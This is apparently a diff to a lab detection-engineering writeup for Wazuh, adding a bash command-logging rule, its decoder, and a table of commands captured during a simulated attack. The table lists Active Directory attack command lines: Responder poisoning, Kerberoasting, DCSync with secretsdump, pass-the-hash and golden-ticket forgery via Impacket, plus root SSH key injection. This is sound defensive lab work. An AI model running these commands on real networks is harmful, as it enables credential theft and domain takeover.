@@ -1,8 +1,8 @@
 # Wazuh Detection Engineering — Rules, Decoders & Tuning
 
 > **Production Configuration & Artifacts:**
-> - Complete XML Ruleset: [`local_rules.xml`](local_rules.xml)
-> - Custom Log Decoders: [`local_decoder.xml`](local_decoder.xml)
+> - Complete XML Ruleset: [`local_rules.xml`](../../06-Resources/rules/wazuh/local_rules.xml)
+> - Custom Log Decoders: [`local_decoder.xml`](../../06-Resources/rules/wazuh/local_decoder.xml)
 > - Wazuh Manager Config: [`ossec.conf`](../../06-Resources/configs/ossec.conf)
 > - Ingestion Hook: [`custom-thehive`](../../06-Resources/scripts/custom-thehive)
 > - Correlation Engine: [`custom-thehive.py`](../../06-Resources/scripts/custom-thehive.py)
@@ -35,6 +35,86 @@ The production ruleset contains **148 total `<rule id>` definitions**:
 ---
 
 ## 2. Key Custom Detection Rules
+
+### Rule 100220 — Host Shell Execution & Interactive Command Auditing (`bashcmd`)
+Captures verbatim interactive command executions on the DVWA web server (`192.168.56.30`). This custom detection pipeline provides the primary ground-truth host forensics for all post-exploitation activities conducted from the Linux pivot.
+
+#### 🛡️ The Web Server Anomaly Principle
+Production web application servers are static, headless execution environments running Apache, PHP, and database engines. Under normal operations, service accounts (`www-data`) never spawn interactive shells, and system administrators do not execute ad-hoc commands on production web servers without scheduled change windows. Therefore, **any interactive Bash command executed on the web server—whether under `www-data` following web shell exploitation or escalated to `root`—is an inherent, high-fidelity security anomaly indicating active human adversary presence.**
+
+#### ⚙️ Pipeline Architecture: From Shell Hook to Wazuh SIEM
+Standard Linux Auditd monitors `execve` system calls, but can miss shell built-ins (`export`, `cd`, `echo ... >> file`) and multi-command pipe chains without generating prohibitive log volume. The custom `bashcmd` pipeline captures every interactive command with complete execution context:
+
+1. **Global Shell Hook:** `/etc/bash.bashrc` and `/etc/profile` inject a global `PROMPT_COMMAND` hook that fires upon completion of every terminal command:
+   ```bash
+   export PROMPT_COMMAND='logger -p local0.notice -t bashcmd "uid:$(id -u) user:$(id -un) pwd:$(pwd) cmd:$(history 1 | sed "s/^[ ]*[0-9]*[ ]*//")"'
+   ```
+2. **Dedicated Syslog Channel:** `/etc/rsyslog.d/50-bashcmd.conf` filters `local0.notice` tagged `bashcmd` into `/var/log/bashcmd.log`.
+3. **Agent Log Collector:** The Wazuh agent collects `/var/log/bashcmd.log` and streams entries to the Wazuh Manager.
+4. **Custom Decoder (`local_decoder.xml`):**
+   ```xml
+   <decoder name="bashcmd">
+     <program_name>^bashcmd$</program_name>
+   </decoder>
+
+   <decoder name="bashcmd-fields">
+     <parent>bashcmd</parent>
+     <use_own_name>yes</use_own_name>
+     <prematch>uid:\d+ user:</prematch>
+     <regex type="pcre2">uid:(\d+) user:(\S+) pwd:(\S+) cmd:(.+)$</regex>
+     <order>uid, user, pwd, command</order>
+   </decoder>
+   ```
+5. **Detection Rule (`local_rules.xml`):**
+   ```xml
+   <group name="local,bash_command_log,">
+     <rule id="100220" level="5">
+       <program_name>^bashcmd$</program_name>
+       <description>Bash command by $(dstuser) (uid:$(uid)): $(command)</description>
+     </rule>
+   </group>
+   ```
+
+#### 🔍 Forensic Indexing vs. SOAR Integration Gate (Level 5 vs. Level $\ge 8$)
+Wazuh routes alerts with `level >= 8` to `custom-thehive` for automated ticket generation in TheHive 5 to prevent SOAR alert floods. Rule 100220 is intentionally configured at **Level 5**:
+- Every single interactive command is decoded, indexed in OpenSearch, and committed to `Wazuh-Raw-Alerts.csv`.
+- When high-severity milestone alerts trigger TheHive cases (e.g., Rule 5402 PAM sudo elevation, Rule 550 FIM `authorized_keys` modification, or Rule 5715 root SSH login), SOC analysts query `rule.id: 100220` on agent `DVWA` to retrieve the verbatim, chronological command-line history typed by the adversary.
+
+#### 📊 Empirical Telemetry: Verbatim Commands Captured in `Wazuh-Raw-Alerts.csv`
+During the 20-stage attack simulation, Rule 100220 fired **50 times** (CSV rows 9139 to 9501), capturing every key offensive tool execution:
+
+| CSV Row | Timestamp (IST) | User (UID) | Working Dir | Verbatim Command Captured | Associated Attack Stage |
+|:---:|:---:|:---:|:---|:---|:---|
+| **9139** | `17:25:22` | root (33) | `/var/www/.../uploads` | `stty sane` | Stage 06: Reverse Shell Stabilization |
+| **9144** | `17:25:28` | root (33) | `/var/www/.../uploads` | `export TERM=xterm` | Stage 06: Shell Environment Setup |
+| **9148** | `17:25:31` | root (33) | `/var/www/.../uploads` | `sudo -l` | Stage 07: Sudo PrivEsc Enumeration |
+| **9155–9158** | `17:26:10` | root (0) | `/var/www/.../uploads` | `chmod 700 /root/.ssh && cat .../authorized_keys` | Stage 08: SSH Persistence Preparation |
+| **9164** | `17:29:19` | root (0) | `/var/www/.../uploads` | `echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5..." >> /root/.ssh/authorized_keys` | Stage 08: Root SSH Key Injection |
+| **9170** | `17:30:28` | root (0) | `/root` | `hostname && id && ip a` | Stage 09: Pivot Host Discovery |
+| **9184** | `17:31:19` | root (0) | `/root` | `nmap -sV -O 192.168.56.0/24 --open` | Stage 09: Internal Subnet Discovery Sweep |
+| **9215** | `17:32:27` | root (0) | `/root` | `nmap -sV -O 192.168.232.0/24 --open` | Stage 09: Perimeter Subnet Sweep |
+| **9221** | `17:35:41` | root (0) | `/tmp` | `cd /tmp && tar -xzf dvwa_tools.tar.gz` | Stage 10: Responder Tool Unpacking |
+| **9222** | `17:35:54` | root (0) | `/tmp` | `pip install --break-system-packages /tmp/pkgs/*` | Stage 10: Offensive Dependencies Install |
+| **9223** | `17:35:55` | root (0) | `/tmp` | `echo "192.168.56.10 PC-DC.ad.lab ad.lab" >> /etc/hosts` | Stage 10: Domain Controller DNS Staging |
+| **9226–9232** | `17:36:08` | root (0) | `/tmp` | `sudo systemctl stop apache2 && sed ... resolved.conf` | Stage 10: Port 53/80 Conflict Resolution |
+| **9233** | `17:36:26` | root (0) | `/tmp` | `python3 /opt/Responder/Responder.py -I ens33 -wd` | Stage 10: Responder LLMNR Poisoning Start |
+| **9242** | `17:37:25` | root (0) | `/tmp` | `python3 /opt/Responder/Responder.py -I ens33 -wd` | Stage 10: Responder Second Invocations |
+| **9244** | `17:38:29` | root (0) | `/tmp` | `cp /opt/Responder/logs/SMB-NTLMv2-SSP-... /tmp/win10.hash` | Stage 10: NetNTLMv2 Hash Extraction |
+| **9259** | `18:01:00` | root (0) | `/tmp` | `cd /tmp && python3 -m bloodhound -d ad.lab -u win10 -p 'Secur3Lab!' -dc PC-DC.ad.lab -ns 192.168.56.10 -c All --zip` | Stage 12: BloodHound AD Enumeration |
+| **9264** | `18:01:18` | root (0) | `/tmp` | `python3 /usr/local/bin/GetUserSPNs.py ad.lab/win10:'Secur3Lab!' -dc-ip 192.168.56.10 -request -outputfile /tmp/hank.hash 2>/dev/null` | Stage 13: Kerberoasting HANK_SHERMAN |
+| **9274** | `18:02:40` | root (0) | `/tmp` | `python3 /usr/local/bin/secretsdump.py ad.lab/HANK_SHERMAN:'Password123'@192.168.56.10 -outputfile /tmp/dcsync_output` | Stage 14: DCSync NTDS Password Replication |
+| **9276** | `18:02:49` | root (0) | `/tmp` | `cat /tmp/dcsync_output.ntds` | Stage 14: Dumped Hashes Verification |
+| **9286** | `18:04:15` | root (0) | `/tmp` | `python3 /usr/local/bin/lookupsid.py ad.lab/HANK_SHERMAN:'Password123'@192.168.56.10 \| grep "Domain SID"` | Stage 16: Domain SID Discovery for Golden Ticket |
+| **9304** | `18:06:26` | root (0) | `/tmp` | `python3 /usr/local/bin/wmiexec.py -hashes :cc814... Administrator@192.168.56.10` | Stage 15: Pass-the-Hash Lateral Movement |
+| **9306** | `18:06:40` | root (0) | `/tmp` | `python3 /usr/local/bin/ticketer.py -nthash 611a8... -domain-sid S-1-5-21-3315718683-193253855-3518612541 -domain ad.lab Administrator` | Stage 16: Golden Ticket Forgery (krbtgt KVNO 3) |
+| **9307** | `18:06:48` | root (0) | `/tmp` | `export KRB5CCNAME=/tmp/Administrator.ccache` | Stage 16: Kerberos Cache Initialization |
+| **9373** | `18:14:50` | root (0) | `/tmp` | `python3 /usr/local/bin/wmiexec.py -k -no-pass ad.lab/Administrator@PC-DC.ad.lab` | Stage 17: Golden Ticket Lateral WMI to DC |
+| **9391** | `18:16:34` | root (0) | `/tmp` | `python3 /usr/local/bin/wmiexec.py -hashes :cc814... Administrator@192.168.56.20` | Stage 18: Workstation Lateral WMI Execution |
+| **9393** | `18:17:09` | root (0) | `/tmp` | `ls /tmp/domain_users.txt /tmp/admin_info.txt /tmp/sensitive_data.txt` | Stage 18: Staged Data Files Verification |
+| **9443** | `18:21:04` | root (0) | `/tmp` | `python3 /usr/local/bin/wmiexec.py -k -no-pass ad.lab/Administrator@PC-DC.ad.lab` | Stage 20: Golden Ticket DC Impact Execution |
+| **9501** | `18:24:18` | root (0) | `/tmp` | `python3 /usr/local/bin/wmiexec.py -hashes :cc814... Administrator@192.168.56.20` | Stage 20: Workstation Defacement & Reboot |
+
+---
 
 ### Rule 100613 — Impacket `wmiexec` Detection
 Detects semi-interactive remote command execution via WMI using Impacket's `wmiexec.py`. Impacket spawns `cmd.exe /Q /c` and stages output via a temporary file on the administrative `ADMIN$\__<id>` share.
@@ -311,13 +391,13 @@ In Wazuh's default ruleset (`0025-suricata_rules.xml`), Rule `86601` (`Suricata:
 
 ## 6. Alert Exports & Telemetry Datasets
 
-The repository provides two empirical alert export datasets in [`../../06-Resources/files/alerts/`](../../06-Resources/files/alerts/):
+The repository provides two empirical alert export datasets in [`../../06-Resources/alerts/`](../../06-Resources/alerts/):
 
 | Dataset File | Records | Scope & Content |
 |---|---|---|
-| [`Wazuh-Raw-Alerts.csv`](../../06-Resources/files/alerts/Wazuh-Raw-Alerts.csv) | **9,567 rows** | Complete baseline raw alert export across all 4 agents (`DVWA`: 8,114, `Suricata`: 1,168, `DomainWin10`: 168, `Win10User`: 117) indexed in OpenSearch following detection rule evaluation. Contains raw rule descriptions, agent names, and JSON-encoded event objects in `full_log`. |
-| [`wazuh_alerts.csv`](../../06-Resources/files/alerts/wazuh_alerts.csv) | **808 rows** | Analyst-curated forensic analysis dataset. Created by applying 11 OpenSearch `must_not` exclusion filters on the Wazuh Dashboard to strip 404 scan floods, SCA scans, and background services, isolating genuine attack steps for triage. |
-| [`thehive_alerts.json`](../../06-Resources/files/alerts/thehive_alerts.json) | **46 alerts** | Actionable incident cases created LIVE during simulation execution directly from the raw stream via the Wazuh Level >= 8 integration gate and the `thecustomhive` two-tier correlation daemon. |
+| [`Wazuh-Raw-Alerts.csv`](../../06-Resources/alerts/Wazuh-Raw-Alerts.csv) | **9,567 rows** | Complete baseline raw alert export across all 4 agents (`DVWA`: 8,114, `Suricata`: 1,168, `DomainWin10`: 168, `Win10User`: 117) indexed in OpenSearch following detection rule evaluation. Contains raw rule descriptions, agent names, and JSON-encoded event objects in `full_log`. |
+| [`wazuh_alerts.csv`](../../06-Resources/alerts/wazuh_alerts.csv) | **808 rows** | Analyst-curated forensic analysis dataset. Created by applying 11 OpenSearch `must_not` exclusion filters on the Wazuh Dashboard to strip 404 scan floods, SCA scans, and background services, isolating genuine attack steps for triage. |
+| [`thehive_alerts.json`](../../06-Resources/alerts/thehive_alerts.json) | **46 alerts** | Actionable incident cases created LIVE during simulation execution directly from the raw stream via the Wazuh Level >= 8 integration gate and the `thecustomhive` two-tier correlation daemon. |
 
 ### CSV Structure
 Both CSV exports contain three core columns:
